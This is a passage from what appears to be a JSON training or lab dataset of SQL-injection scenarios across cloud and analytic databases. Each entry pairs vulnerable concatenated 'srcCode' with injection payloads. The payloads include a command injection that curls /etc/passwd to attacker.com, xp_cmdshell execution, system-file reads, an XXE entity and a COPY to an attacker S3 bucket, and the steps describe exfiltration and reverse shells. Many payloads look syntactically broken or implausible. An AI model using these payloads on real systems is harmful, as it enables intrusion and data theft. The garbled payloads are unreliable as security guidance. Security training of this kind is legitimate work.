                    "Solution Steps": [
                      "Identify wildcard table usage",
                      "Inject through table pattern",
                      "Bypass pattern validation",
                      "Access unauthorized datasets",
                      "Exfiltrate data via table expansion"
                    ],
                    "Vulnerability name": "BigQuery Wildcard Injection",
                    "srcCode": "SELECT * FROM `project.dataset.\\\\\" + userPattern + \\\\\"`",
                    "payloads": [
                      "table_*` FROM (SELECT * FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA) x--",
                      "legit_table` WHERE _TABLE_SUFFIX = '') UNION SELECT 1,2,3--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Snowflake Session Parameter Defaults",
                    "Lab Description": "A Snowflake configuration tool sets session parameters with dynamic defaults. The default expressions are concatenated directly into ALTER SESSION statements, allowing injection during session initialization.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify session parameter settings",
                      "Inject through default value expressions",
                      "Trigger new session creation",
                      "Bypass parameter validation",
                      "Persist settings across queries"
                    ],
                    "Vulnerability name": "Snowflake Session Default Injection",
                    "srcCode": "ALTER SESSION SET '\\\\\" + userParam + \\\\\"' = '\\\\\" + userValue + \\\\\"'",
                    "payloads": [
                      "TIMESTAMP_OUTPUT_FORMAT', 'YYYY-MM-DD HH24:MI:SS') FROM (SELECT * FROM information_schema.tables) x--",
                      "QUERY_TAG', 'test'); SELECT * FROM account_usage.access_history--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Databricks SQL Warehouse Configurations",
                    "Lab Description": "A Databricks environment configures SQL warehouses with dynamic parameters. The configuration strings are concatenated directly into warehouse creation, allowing injection during cluster startup.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify warehouse creation endpoints",
                      "Inject through config parameters",
                      "Trigger warehouse startup",
                      "Bypass config validation",
                      "Access metastore via driver nodes"
                    ],
                    "Vulnerability name": "Databricks Warehouse Config Injection",
                    "srcCode": "CREATE WAREHOUSE my_warehouse WITH '\\\\\" + userConfig + \\\\\"'",
                    "payloads": [
                      "AUTO_STOP = 1200) FROM (SELECT * FROM system.metastore.tables) x--",
                      "CLUSTER_SIZE = 'Small'); SELECT * FROM hive_metastore.default.secrets--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Trino Catalog Function Namespaces",
                    "Lab Description": "A Trino cluster creates catalog functions with dynamic namespaces. The namespace paths are concatenated directly into function registration, allowing injection during UDF execution.",
                    "Difficulty Level": "Medium",
                    "Solution Steps": [
                      "Identify function creation endpoints",
                      "Inject through namespace parameters",
                      "Trigger function execution",
                      "Bypass namespace validation",
                      "Access system functions"
                    ],
                    "Vulnerability name": "Trino Function Namespace Injection",
                    "srcCode": "CREATE FUNCTION '\\\\\" + userNamespace + \\\\\".my_func AS '\\\\\" + userLogic + \\\\\"'",
                    "payloads": [
                      "system', 'return 1') FROM (SELECT * FROM system.metadata.catalogs) x--",
                      "pg_catalog', 'SELECT * FROM pg_user')--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in Presto Table Function Parameters",
                    "Lab Description": "A Presto cluster uses table functions with dynamic arguments. The parameter strings are concatenated directly into function calls, allowing injection during table generation.",
                    "Difficulty Level": "Hard",
                    "Solution Steps": [
                      "Identify table function usage",
                      "Inject through function parameters",
                      "Bypass argument validation",
                      "Modify generated table contents",
                      "Access system tables via function errors"
                    ],
                    "Vulnerability name": "Presto Table Function Injection",
                    "srcCode": "SELECT * FROM TABLE(system.query(query => '\\\\\" + userQuery + \\\\\"'))",
                    "payloads": [
                      "SELECT 1')) FROM (SELECT * FROM system.runtime.nodes) x--",
                      "SELECT * FROM tpch.sf1.customer')) WHERE 1=0 UNION SELECT 1,2,3--"
                    ]
                  },
                  {
                    "Lab scenario": "SQL Injection in ClickHouse Dictionary Source URLs",
                    "Lab Description": "A ClickHouse cluster configures external dictionaries with dynamic source URLs. The URLs are concatenated directly into dictionary definitions, allowing injection during dictionary loading.",
                    "Difficulty Level": "Medium",
                    "Solution Steps": [
                      "Identify dictionary creation",
                      "Inject through source URL parameters",
                      "Trigger dictionary reload",
                      "Bypass URL validation",
                      "Modify dictionary contents"
                    ],
                    "Vulnerability name": "ClickHouse Dictionary URL Injection",
                    "srcCode": "CREATE DICTIONARY my_dict (SOURCE(HTTP(URL '\\\\\" + userUrl + \\\\\"')))",
                    "payloads": [
                      "http://attacker.com/payload')) FROM (SELECT * FROM system.dictionaries) x--",
                      "https://legit.com/data.json')) WHERE 1=0 UNION SELECT 1--"
                    ]
                  },
                  
                  {
                        "Lab scenario": "SQL Injection in PostgreSQL NOTIFY Channel Payload",
                        "Lab Description": "A real-time alert system uses PostgreSQL's NOTIFY command with unsanitized channel payloads. Attackers can inject SQL through crafted notification messages that execute when clients LISTEN to the channel, bypassing typical query defenses.",
                        "Difficulty Level": "Hard",
                        "Solution Steps": [
                          "Identify NOTIFY command usage",
                          "Craft malicious payload in channel message",
                          "Trigger notification event",
                          "Bypass payload length restrictions",
                          "Exfiltrate data through notification responses"
                        ],
                        "Vulnerability name": "PostgreSQL NOTIFY Injection",
                        "srcCode": "SELECT pg_notify('alerts', '\\'' + userMessage + '\\'');",
                        "payloads": [
                          "' || (SELECT version()) || '",
                          "test' FROM (SELECT * FROM pg_user) x--"
                        ]
                      },
                      {
                        "Lab scenario": "SQL Injection in MySQL GROUP_CONCAT Separator",
                        "Lab Description": "A reporting dashboard dynamically sets GROUP_CONCAT separators with user input. The separator string is concatenated directly into queries, allowing injection during result aggregation.",
                        "Difficulty Level": "Medium",
                        "Solution Steps": [
                          "Identify GROUP_CONCAT usage",
                          "Inject through separator parameter",
                          "Bypass string truncation defenses",
                          "Leak data via concatenated results",
                          "Chain multiple value exfiltration"
                        ],
                        "Vulnerability name": "MySQL Separator Injection",
                        "srcCode": "SELECT GROUP_CONCAT(username SEPARATOR '\\'' + userSeparator + '\\'') FROM users",
                        "payloads": [
                          "' FROM (SELECT password FROM users) x--",
                          "\\n') UNION SELECT table_name FROM information_schema.tables--"
                        ]
                      },
                      {
                        "Lab scenario": "SQL Injection in SQL Server STRING_AGG Delimiter",
                        "Lab Description": "A data export feature uses STRING_AGG with dynamic delimiters. The unsanitized delimiter parameter allows breaking out of string context into SQL execution.",
                        "Difficulty Level": "Medium",
                        "Solution Steps": [
                          "Locate STRING_AGG function calls",
                          "Inject through delimiter parameter",
                          "Bypass NVARCHAR conversion",
                          "Execute stacked queries",
                          "Export data via manipulated CSVs"
                        ],
                        "Vulnerability name": "SQL Server Delimiter Injection",
                        "srcCode": "SELECT STRING_AGG(product_name, '\\'' + userDelimiter + '\\'') FROM products",
                        "payloads": [
                          "') FROM (SELECT * FROM sys.sql_logins)--",
                          "'\\t') UNION SELECT name FROM sys.databases--"
                        ]
                      },
                      {
                        "Lab scenario": "SQL Injection in Oracle LISTAGG Delimiter Clause",
                        "Lab Description": "An Oracle APEX application builds LISTAGG queries with user-controlled delimiters. The delimiter clause is concatenated directly into analytic function execution.",
                        "Difficulty Level": "Hard",
                        "Solution Steps": [
                          "Identify LISTAGG usage in reports",
                          "Break delimiter context with charset escaping",
                          "Execute DBMS_LOCK functions",
                          "Bypass ORA-01489 protection",
                          "Exfiltrate via utl_http requests"
                        ],
                        "Vulnerability name": "Oracle LISTAGG Injection",
                        "srcCode": "SELECT LISTAGG(username, '\\'' + userDelimiter + '\\'') WITHIN GROUP (ORDER BY 1) FROM employees",
                        "payloads": [
                          "'||CHR(58)||(SELECT table_name FROM all_tables WHERE rownum=1)--",
                          "'') FROM (SELECT * FROM v$version) WHERE ROWNUM=1--"
                        ]
                      },
                      {
                        "Lab scenario": "SQL Injection in Snowflake ARRAY_TO_STRING Delimiter",
                        "Lab Description": "A Snowflake data pipeline uses ARRAY_TO_STRING with dynamic delimiters. The delimiter parameter is embedded directly into JavaScript UDFs, allowing injection during array serialization.",
                        "Difficulty Level": "Medium",
                        "Solution Steps": [
                          "Locate ARRAY_TO_STRING calls",
                          "Inject through delimiter parameter",
                          "Bypass JavaScript sandboxing",
                          "Access account usage views",
                          "Exfiltrate via external stages"
                        ],
                        "Vulnerability name": "Snowflake Array Serialization Injection",
                        "srcCode": "SELECT ARRAY_TO_STRING(ARRAY_CONSTRUCT('a','b'), '\\'' + userDelimiter + '\\'')",
                        "payloads": [
                          "')::STRING FROM (SELECT * FROM information_schema.tables)--",
                          "' || (SELECT current_warehouse()))--"
                        ]
                      },
                      {
                        "Lab scenario": "SQL Injection in BigQuery FORMAT() Pattern",
                        "Lab Description": "A BigQuery ML model uses FORMAT() with dynamic format patterns. The format string is concatenated directly into query execution, allowing injection during type conversion.",
                        "Difficulty Level": "Hard",
                        "Solution Steps": [
                          "Identify FORMAT() function usage",
                          "Inject through format specifiers",
                          "Bypass parameter validation",
                          "Access region-specific datasets",
                          "Leak data through CAST errors"
                        ],
                        "Vulnerability name": "BigQuery Format String Injection",
                        "srcCode": "SELECT FORMAT('The result is: %s', '\\'' + userPattern + '\\'')",
                        "payloads": [
                          "%T' FROM (SELECT * FROM `region-us`.INFORMATION_SCHEMA.TABLES)--",
                          "%d') UNION SELECT 1,2,3--"
                        ]
                      },
                      {
                        "Lab scenario": "SQL Injection in Azure Synapse OPENJSON Path",
                        "Lab Description": "A Synapse pipeline processes JSON data with dynamic path expressions. The JSON path is concatenated directly into OPENJSON calls, allowing injection during document parsing.",
                        "Difficulty Level": "Medium",
                        "Solution Steps": [
                          "Locate OPENJSON usage",
                          "Inject through JSON path parameters",
                          "Bypass lax/strict mode validation",
                          "Access linked storage accounts",
                          "Exfiltrate via external tables"
                        ],
                        "Vulnerability name": "Synapse JSON Path Injection",
                        "srcCode": "SELECT * FROM OPENJSON(@json, '\\'' + userPath + '\\'')",
                        "payloads": [
                          "$.user') FROM (SELECT * FROM sys.dm_pdw_exec_requests)--",
                          "lax $[*]?(@.id == 1)) WITH (data NVARCHAR(MAX) AS JSON)--"
                        ]
                      },
                      {
                        "Lab scenario": "SQL Injection in Databricks JSON_TUPLE Function",
                        "Lab Description": "A Databricks notebook processes JSON records with dynamic field names. The field path is concatenated directly into JSON_TUPLE calls, allowing injection during struct extraction.",
                        "Difficulty Level": "Hard",
                        "Solution Steps": [
                          "Identify JSON_TUPLE usage",
                          "Inject through field name parameters",
                          "Bypass Spark SQL parser",
                          "Access metastore tables",
                          "Exfiltrate via DBFS paths"
                        ],
                        "Vulnerability name": "Databricks JSON Field Injection",
                        "srcCode": "SELECT JSON_TUPLE(json_col, '\\'' + userField + '\\'') FROM events",
                        "payloads": [
                          "user_id') FROM (SELECT * FROM spark_catalog.default.tables)--",
                          "email') WHERE 1=0 UNION SELECT 1,2--"
                        ]
                      },
                      {
                        "Lab scenario": "SQL Injection in Redshift JSON_EXTRACT_PATH_TEXT Path",
                        "Lab Description": "A Redshift analytics dashboard builds JSON path queries with user input. The path parameter is concatenated directly into JSON extraction functions.",
                        "Difficulty Level": "Medium",
                        "Solution Steps": [
                          "Locate JSON_EXTRACT_PATH_TEXT calls",
                          "Inject through path expressions",
                          "Bypass SUPER type validation",
                          "Access SVV_TABLE_INFO",
                          "Exfiltrate via UNLOAD commands"
                        ],
                        "Vulnerability name": "Redshift JSON Path Injection",
                        "srcCode": "SELECT JSON_EXTRACT_PATH_TEXT(json_col, '\\'' + userPath + '\\'') FROM semi_structured",
                        "payloads": [
                          "key') FROM (SELECT * FROM svv_external_tables) x--",
                          "array[0]') WHERE 1=0 UNION SELECT 1,2,3--"
                        ]
                      },
                      {
                        "Lab scenario": "SQL Injection in Snowflake PARSE_JSON Path",
                        "Lab Description": "A Snowflake data transformation uses PARSE_JSON with dynamic path expressions. The path is concatenated directly into JSON parsing logic.",
                        "Difficulty Level": "Hard",
                        "Solution Steps": [
                          "Identify PARSE_JSON usage",
                          "Inject through path traversal",
                          "Bypass VARIANT type constraints",
                          "Access account usage views",
                          "Exfiltrate via internal stages"
                        ],
                        "Vulnerability name": "Snowflake JSON Parse Injection",
                        "srcCode": "SELECT PARSE_JSON('\\'' + userJson + '\\''):'\\'' + userPath + '\\''",
                        "payloads": [
                          "{\"a\":1}')::VARCHAR FROM (SELECT * FROM information_schema.tables)--",
                          "legit') WHERE 1=0 UNION SELECT OBJECT_CONSTRUCT('key', SYSTEM$WHITELIST())--"
                        ]
                      },
                      {
                        "Lab scenario": "SQL Injection in CockroachDB SHOW RANGES Table Pattern",
                        "Lab Description": "A CockroachDB monitoring tool uses SHOW RANGES with dynamic table patterns. The pattern is concatenated directly into range metadata queries.",
                        "Difficulty Level": "Medium",
                        "Solution Steps": [
                          "Identify SHOW RANGES usage",
                          "Inject through table pattern",
                          "Bypass identifier quoting",
                          "Access crdb_internal tables",
                          "Exfiltrate via changefeeds"
                        ],
                        "Vulnerability name": "CockroachDB Range Metadata Injection",
                        "srcCode": "SHOW RANGES FROM TABLE '\\'' + userTable + '\\''",
                        "payloads": [
                          "users') FROM (SELECT * FROM crdb_internal.tables)--",
                          "legit') WHERE 1=0 UNION SELECT 1,2,3--"
                        ]
                      },
                      {
                        "Lab scenario": "SQL Injection in DuckDB READ_CSV Auto-Detect Parameter",
                        "Lab Description": "A DuckDB data loader uses READ_CSV with dynamic type detection parameters. The auto-detection clause is concatenated directly into file parsing logic.",
                        "Difficulty Level": "Hard",
                        "Solution Steps": [
                          "Locate READ_CSV calls",
                          "Inject through auto_detect parameters",
                          "Bypass file header validation",
                          "Access system tables",
                          "Exfiltrate via HTTPFS"
                        ],
                        "Vulnerability name": "DuckDB CSV Parsing Injection",
                        "srcCode": "SELECT * FROM READ_CSV('input.csv', auto_detect = '\\'' + userDetect + '\\'')",
                        "payloads": [
                          "true') FROM (SELECT * FROM duckdb_tables())--",
                          "false') WHERE 1=0 UNION SELECT * FROM duckdb_columns()--"
                        ]
                      },
                      {
                        "Lab scenario": "SQL Injection in Materialize TAIL Timestamp",
                        "Lab Description": "A Materialize streaming pipeline uses TAIL with dynamic timestamp filters. The timestamp expression is concatenated directly into change data capture queries.",
                        "Difficulty Level": "Medium",
                        "Solution Steps": [
                          "Identify TAIL command usage",
                          "Inject through timestamp parameter",
                          "Bypass MZ_TIMESTAMP validation",
                          "Access internal sources",
                          "Exfiltrate via sinks"
                        ],
                        "Vulnerability name": "Materialize CDC Injection",
                        "srcCode": "TAIL source WITH (SNAPSHOT = '\\'' + userTs + '\\'')",
                        "payloads": [
                          "2023-01-01') FROM (SELECT * FROM mz_catalog.mz_tables)--",
                          "now()') WHERE 1=0 UNION SELECT 1,2,3--"
                        ]
                      },
                      {
                        "Lab scenario": "SQL Injection in SingleStore Columnstore Segment Filter",
                        "Lab Description": "A SingleStore analytics platform builds columnstore segment filters with user input. The filter expressions are concatenated directly into segment pruning logic.",
                        "Difficulty Level": "Hard",
                        "Solution Steps": [
                          "Identify columnstore queries",
                          "Inject through segment filters",
                          "Bypass vectorized execution",
                          "Access memsql system tables",
                          "Exfiltrate via leaf nodes"
                        ],
                        "Vulnerability name": "SingleStore Segment Injection",
                        "srcCode": "SELECT * FROM table WHERE columnstore_filter('\\'' + userFilter + '\\'')",
                        "payloads": [
                          "id=1') FROM (SELECT * FROM information_schema.tables)--",
                          "value>0') UNION SELECT * FROM sys.nodes--"
                        ]
                      },
                      {
                        "Lab scenario": "SQL Injection in YugabyteDB YSQL EXPLAIN Format",
                        "Lab Description": "A YugabyteDB performance tool uses EXPLAIN with dynamic format parameters. The format string is concatenated directly into query plan generation.",
                        "Difficulty Level": "Medium",
                        "Solution Steps": [
                          "Locate EXPLAIN ANALYZE calls",
                          "Inject through format parameter",
                          "Bypass JSON output validation",
                          "Access pg_catalog tables",
                          "Exfiltrate via yb_servers()"
                        ],
                        "Vulnerability name": "Yugabyte Explain Injection",
                        "srcCode": "EXPLAIN (FORMAT '\\'' + userFormat + '\\'') SELECT * FROM table",
                        "payloads": [
                          "json') FROM (SELECT * FROM pg_stat_activity)--",
                          "text') UNION SELECT 1,2,3--"
                        ]
                      },


                       {
                            "Lab scenario": "SQL Injection in PostgreSQL COPY TO PROGRAM",
                            "Lab Description": "A data export feature uses PostgreSQL's COPY TO PROGRAM command with dynamic filenames. The program argument is concatenated directly into the command, allowing command injection through crafted filenames.",
                            "Difficulty Level": "Critical",
                            "Solution Steps": [
                              "Identify COPY TO PROGRAM usage",
                              "Inject shell commands through filename",
                              "Bypass path validation",
                              "Execute system commands",
                              "Exfiltrate data via reverse shell"
                            ],
                            "Vulnerability name": "PostgreSQL COPY Command Injection",
                            "srcCode": "COPY (SELECT * FROM sensitive_data) TO PROGRAM 'cp /tmp/\" + userFilename + \"'",
                            "payloads": [
                              "data.csv; curl http://attacker.com/$(cat /etc/passwd)",
                              "legit.csv' || (SELECT pg_read_file('/etc/passwd'))--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in MySQL LOAD DATA LOCAL INFILE",
                            "Lab Description": "A data import tool uses LOAD DATA LOCAL INFILE with dynamic path parameters. The path is concatenated directly into the statement, allowing file system access through path traversal.",
                            "Difficulty Level": "High",
                            "Solution Steps": [
                              "Identify LOAD DATA usage",
                              "Inject path traversal sequences",
                              "Bypass file permission checks",
                              "Read arbitrary files",
                              "Exfiltrate via DNS lookups"
                            ],
                            "Vulnerability name": "MySQL Local File Injection",
                            "srcCode": "LOAD DATA LOCAL INFILE '\" + userFilePath + \"' INTO TABLE temp_data",
                            "payloads": [
                              "../../../../etc/passwd",
                              "legit.csv' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in SQL Server BULK INSERT FORMATFILE",
                            "Lab Description": "A data migration system uses BULK INSERT with dynamic format files. The format file path is concatenated directly into the command, allowing arbitrary file reads through XML external entities.",
                            "Difficulty Level": "High",
                            "Solution Steps": [
                              "Identify BULK INSERT operations",
                              "Inject malicious format file path",
                              "Exploit XML external entities",
                              "Read system files",
                              "Exfiltrate via error messages"
                            ],
                            "Vulnerability name": "SQL Server BULK INSERT XXE",
                            "srcCode": "BULK INSERT customers FROM '\" + userDataFile + \"' WITH (FORMATFILE = '\" + userFormatFile + \"')",
                            "payloads": [
                              "C:\\data.xml', 'C:\\malicious.fmt')--",
                              "legit.csv', 'format.xml<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">']>"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Oracle UTL_FILE File Operations",
                            "Lab Description": "A document management system uses UTL_FILE with dynamic paths. The directory object and filename parameters are concatenated directly into procedure calls, allowing file system access.",
                            "Difficulty Level": "Critical",
                            "Solution Steps": [
                              "Identify UTL_FILE usage",
                              "Inject path traversal sequences",
                              "Bypass directory object restrictions",
                              "Read/write arbitrary files",
                              "Execute system commands via log poisoning"
                            ],
                            "Vulnerability name": "Oracle UTL_FILE Injection",
                            "srcCode": "fhandle := UTL_FILE.FOPEN('\" + userDirectory + \"', '\" + userFilename + \"', 'R');",
                            "payloads": [
                              "DATA_PUMP_DIR', '../../etc/passwd')--",
                              "VALID_DIR', 'legit.log' || CHR(58) || (SELECT table_name FROM all_tables WHERE rownum=1))--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Snowflake External Function HTTP Headers",
                            "Lab Description": "A Snowflake external function passes HTTP headers directly into SQL context. The header values are concatenated into metadata queries without sanitization, allowing injection through crafted API requests.",
                            "Difficulty Level": "High",
                            "Solution Steps": [
                              "Identify external function calls",
                              "Modify request headers",
                              "Bypass header validation",
                              "Execute arbitrary SQL",
                              "Exfiltrate data through function responses"
                            ],
                            "Vulnerability name": "Snowflake Header Injection",
                            "srcCode": "CREATE EXTERNAL FUNCTION api_call(param STRING) RETURNS STRING HEADERS = {'X-User-Id': '\" + userId + \"'} API_INTEGRATION = api_int AS 'https://api.example.com/endpoint'",
                            "payloads": [
                              "' FROM (SELECT * FROM information_schema.tables)--",
                              "1'); SELECT SYSTEM$WHITELIST()--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in BigQuery Scripting Variable Declarations",
                            "Lab Description": "A BigQuery script uses dynamic variable declarations with user input. The variable values are concatenated directly into DECLARE statements, allowing injection during script initialization.",
                            "Difficulty Level": "Medium",
                            "Solution Steps": [
                              "Identify script variable declarations",
                              "Inject through variable assignment",
                              "Bypass type validation",
                              "Execute multiple statements",
                              "Access cross-project datasets"
                            ],
                            "Vulnerability name": "BigQuery Script Variable Injection",
                            "srcCode": "DECLARE filter STRING DEFAULT '\" + userInput + \"';",
                            "payloads": [
                              "' OR 1=1--",
                              "test' UNION SELECT dataset_id FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Azure Synapse CETAS External Location",
                            "Lab Description": "A Synapse pipeline creates external tables with dynamic storage locations. The location path is concatenated directly into CETAS statements, allowing injection during table creation.",
                            "Difficulty Level": "High",
                            "Solution Steps": [
                              "Identify CETAS statement usage",
                              "Inject through location parameter",
                              "Bypass storage account validation",
                              "Modify exported data",
                              "Exfiltrate via path manipulation"
                            ],
                            "Vulnerability name": "Synapse CETAS Location Injection",
                            "srcCode": "CREATE EXTERNAL TABLE ext_data WITH (LOCATION = '\" + userLocation + \"') AS SELECT * FROM source",
                            "payloads": [
                              "wasbs://container@storage.blob.core.windows.net/path') WITH (FORMAT='PARQUET') UNION SELECT * FROM sys.sql_logins--",
                              "/tmp/legit') FROM (SELECT * FROM sys.dm_pdw_exec_requests) x--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Databricks Notebook Widget Default Values",
                            "Lab Description": "A Databricks notebook uses widgets with dynamic default values that flow into SQL queries. The widget values are concatenated directly into query text without parameterization.",
                            "Difficulty Level": "Medium",
                            "Solution Steps": [
                              "Identify notebook widgets",
                              "Inject through default value parameters",
                              "Bypass widget type validation",
                              "Execute commands in Spark context",
                              "Access metastore tables"
                            ],
                            "Vulnerability name": "Databricks Widget Default Injection",
                            "srcCode": "dbutils.widgets.text(\"input\", '\" + defaultValue + \"'); spark.sql(\"SELECT * FROM table WHERE col = '\" + dbutils.widgets.get(\"input\") + \"'\")",
                            "payloads": [
                              "' UNION SELECT * FROM hive_metastore.default.secrets--",
                              "test' FROM (SELECT explode(array(1,2,3)))--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Trino Catalog Property Values",
                            "Lab Description": "A Trino cluster configuration tool sets catalog properties with dynamic values. The property values are concatenated directly into catalog configuration files, allowing injection during catalog initialization.",
                            "Difficulty Level": "High",
                            "Solution Steps": [
                              "Identify catalog property settings",
                              "Inject through property values",
                              "Trigger catalog reload",
                              "Bypass property validation",
                              "Access unauthorized data sources"
                            ],
                            "Vulnerability name": "Trino Catalog Property Injection",
                            "srcCode": "CREATE CATALOG my_catalog WITH (property_name = '\" + userValue + \"')",
                            "payloads": [
                              "legit_value') FROM (SELECT * FROM system.metadata.catalogs)--",
                              "true'); INSERT INTO system.runtime.queries VALUES ('malicious')--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Presto Session Property Values",
                            "Lab Description": "A Presto client application sets session properties with dynamic values. The property values are concatenated directly into session initialization queries.",
                            "Difficulty Level": "Medium",
                            "Solution Steps": [
                              "Identify session property endpoints",
                              "Inject through property values",
                              "Bypass property validation",
                              "Modify query execution behavior",
                              "Access system tables"
                            ],
                            "Vulnerability name": "Presto Session Property Injection",
                            "srcCode": "SET SESSION optimize_hash_generation = '\" + userValue + \"'",
                            "payloads": [
                              "true' FROM (SELECT * FROM system.metadata.tables)--",
                              "false'); SELECT * FROM system.runtime.nodes--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in ClickHouse External Dictionary Queries",
                            "Lab Description": "A ClickHouse cluster configures external dictionaries with dynamic source queries. The query text is concatenated directly into dictionary definitions, allowing injection during dictionary loading.",
                            "Difficulty Level": "High",
                            "Solution Steps": [
                              "Identify external dictionary definitions",
                              "Inject through source query parameter",
                              "Trigger dictionary reload",
                              "Bypass query validation",
                              "Access system dictionaries"
                            ],
                            "Vulnerability name": "ClickHouse Dictionary Query Injection",
                            "srcCode": "CREATE DICTIONARY my_dict (SOURCE(CLICKHOUSE(QUERY '\" + userQuery + \"')))",
                            "payloads": [
                              "SELECT 1') FROM system.dictionaries--",
                              "SELECT * FROM source_table')) UNION SELECT * FROM system.processes--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Druid SQL Query Context Parameters",
                            "Lab Description": "A Druid cluster processes SQL queries with dynamic context parameters. The parameter values are concatenated directly into native query conversion, allowing injection during query planning.",
                            "Difficulty Level": "Medium",
                            "Solution Steps": [
                              "Identify query context parameters",
                              "Inject through context values",
                              "Bypass SQL parser validation",
                              "Execute native Druid queries",
                              "Access system tables"
                            ],
                            "Vulnerability name": "Druid Context Parameter Injection",
                            "srcCode": "{\"query\":\"SELECT * FROM datasource\",\"context\":{\"\" + paramName + \"\":\"\" + paramValue + \"\"}}",
                            "payloads": [
                              "\"sqlTimeZone\":\"UTC' FROM (SELECT * FROM sys.segments) x--\"",
                              "\"maxScatterGatherBytes\":\"1000000\"},{\"malicious\":\"' UNION SELECT * FROM sys.servers--\""
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Hive Metastore Table Property Values",
                            "Lab Description": "A Hive metastore service accepts dynamic table properties during table creation. The property values are concatenated directly into metastore queries, allowing injection during DDL operations.",
                            "Difficulty Level": "High",
                            "Solution Steps": [
                              "Identify table property settings",
                              "Inject through property values",
                              "Trigger metastore queries",
                              "Bypass property validation",
                              "Access unauthorized metadata"
                            ],
                            "Vulnerability name": "Hive Metastore Property Injection",
                            "srcCode": "CREATE TABLE my_table (id INT) TBLPROPERTIES ('\" + propName + \"'='\" + propValue + \"')",
                            "payloads": [
                              "comment') FROM (SELECT * FROM TBLS) x--",
                              "key'='value'); SELECT * FROM PARTITIONS--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Impala Query Option Settings",
                            "Lab Description": "An Impala client application sets query options with dynamic values. The option values are concatenated directly into query preparation, allowing injection during execution planning.",
                            "Difficulty Level": "Medium",
                            "Solution Steps": [
                              "Identify query option settings",
                              "Inject through option values",
                              "Bypass option validation",
                              "Modify execution behavior",
                              "Access system tables"
                            ],
                            "Vulnerability name": "Impala Query Option Injection",
                            "srcCode": "SET query_option='\" + userValue + \"'",
                            "payloads": [
                              "legit_value' FROM (SELECT * FROM functional.alltypes) x--",
                              "true'); EXPLAIN SELECT * FROM sys.tables--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in CockroachDB Zone Configuration Values",
                            "Lab Description": "A CockroachDB cluster management tool sets zone configurations with dynamic values. The configuration values are concatenated directly into ALTER statements, allowing injection during replication changes.",
                            "Difficulty Level": "High",
                            "Solution Steps": [
                              "Identify zone configuration changes",
                              "Inject through configuration values",
                              "Trigger configuration propagation",
                              "Bypass validation checks",
                              "Access system ranges"
                            ],
                            "Vulnerability name": "CockroachDB Zone Config Injection",
                            "srcCode": "ALTER PARTITION default OF INDEX my_table@primary CONFIGURE ZONE USING '\" + userConfig + \"'",
                            "payloads": [
                              "range_max_bytes = 134217728') FROM (SELECT * FROM crdb_internal.ranges)--",
                              "constraints = '[+region=us-east1]'); SELECT * FROM [SHOW ALL ZONE CONFIGURATIONS]--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in DuckDB HTTPFS Extension Headers",
                            "Lab Description": "A DuckDB query uses HTTPFS with dynamic request headers. The header values are concatenated directly into HTTP requests, allowing injection during remote file operations.",
                            "Difficulty Level": "Medium",
                            "Solution Steps": [
                              "Identify HTTPFS usage",
                              "Inject through header parameters",
                              "Bypass header validation",
                              "Modify remote requests",
                              "Exfiltrate credentials"
                            ],
                            "Vulnerability name": "DuckDB HTTP Header Injection",
                            "srcCode": "SET s3_access_key_id='\" + userKey + \"'; SET s3_secret_access_key='\" + userSecret + \"'",
                            "payloads": [
                              "AKIA123...' FROM (SELECT * FROM duckdb_settings)--",
                              "legit_key', s3_secret_access_key='secret')) COPY (SELECT * FROM sensitive_data) TO 's3://attacker-bucket/'--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Materialized View Refresh Priority",
                            "Lab Description": "A data warehouse sets materialized view refresh priorities with dynamic values. The priority values are concatenated directly into refresh scheduling queries.",
                            "Difficulty Level": "High",
                            "Solution Steps": [
                              "Identify refresh priority settings",
                              "Inject through priority parameter",
                              "Trigger high-priority refresh",
                              "Bypass dependency checks",
                              "Execute commands during refresh"
                            ],
                            "Vulnerability name": "Materialized View Priority Injection",
                            "srcCode": "ALTER MATERIALIZED VIEW user_stats SET REFRESH PRIORITY \" + userPriority + \"",
                            "payloads": [
                              "100 FROM (SELECT * FROM admin_users) x--",
                              "50); COPY (SELECT * FROM secrets) TO '/tmp/leak'--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in SQL Server PolyBase External Table Options",
                            "Lab Description": "A SQL Server instance creates PolyBase external tables with dynamic options. The option values are concatenated directly into table creation, allowing injection during external data access.",
                            "Difficulty Level": "High",
                            "Solution Steps": [
                              "Identify external table creation",
                              "Inject through option parameters",
                              "Bypass PolyBase validation",
                              "Execute commands on linked servers",
                              "Exfiltrate via external tables"
                            ],
                            "Vulnerability name": "PolyBase Option Injection",
                            "srcCode": "CREATE EXTERNAL TABLE ext_data (id INT) WITH (LOCATION = '/path', \" + userOptions + \")",
                            "payloads": [
                              "DATA_SOURCE = external_source) FROM (SELECT * FROM sys.sql_logins)--",
                              "FORMAT_OPTIONS = 'FIELD_TERMINATOR=,')) EXEC xp_cmdshell('whoami')--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Google BigQuery Remote Function Responses",
                            "Lab Description": "A BigQuery implementation calls remote functions where the HTTP response is interpolated directly into SQL. Malicious function responses can inject SQL that bypasses BigQuery's normal parameterization.",
                            "Difficulty Level": "Critical",
